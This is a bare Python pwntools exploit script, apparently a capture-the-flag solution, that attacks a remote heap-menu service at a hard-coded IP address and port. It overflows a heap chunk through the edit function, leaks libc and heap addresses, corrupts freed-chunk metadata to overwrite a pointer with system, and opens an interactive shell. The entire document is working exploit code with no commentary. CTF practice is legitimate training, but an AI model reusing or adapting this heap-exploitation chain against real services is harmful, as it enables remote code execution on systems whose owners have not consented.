from pwn import *
p=remote('106.75.27.104',50514)
#p=process(['./pwn33'],env={'LD_PRELOAD':'./libc2.23.so'})
e=ELF('./libc2.23.so')
context(log_level='debug')
p.recvuntil('Your choice:')
def create(a,b):
	p.sendline('2')
	p.recvuntil('Please enter the length of servant name:')
	p.sendline(str(a))
	p.recvuntil('Please enter the name of servant:')
	p.sendline(b)
	p.recvuntil('Your choice:')
def dele(a):
	p.sendline('4')
	p.recvuntil('Please enter the index of servant:')
	p.sendline(str(a))
	p.recvuntil('Your choice:')
def edit(a,b,c):
	p.sendline('3')
	p.recvuntil('Please enter the index of servant:')
	p.sendline(str(a))
	p.recvuntil('Please enter the length of servant name:')
	p.sendline(str(b))
	p.recvuntil('Please enter the new name of the servnat:')
	p.sendline(c)
	p.recvuntil('Your choice:')



create(200,'123')

create(0x10,'123')#1

create(200,'123')
create(200,'123')
dele(0)
edit(1,0x200,'a'*0x10+p64(0xf0)+p64(0Xd0))
dele(2)

create(200,'123')

p.sendline('1')
p.recvuntil('1 : ')
libc=u64(p.recvuntil('3')[:-1].ljust(8,chr(0)))-0x3C4B78
system=libc+e.symbols['system']
print hex(libc)
create(0x10,'aaa')
create(0x10,'aaa')
create(0x10,'aaa')#2
dele(4)
dele(2)
p.sendline('1')
p.recvuntil('1 : ')
h=u64(p.recvuntil('3')[:-1].ljust(8,chr(0)))-0x110
print hex(h)
edit(1,0x10,p64(h))
create(0x10,'aaa')

create(0x10,p64(system)*2)

p.sendline('5')


p.interactive()
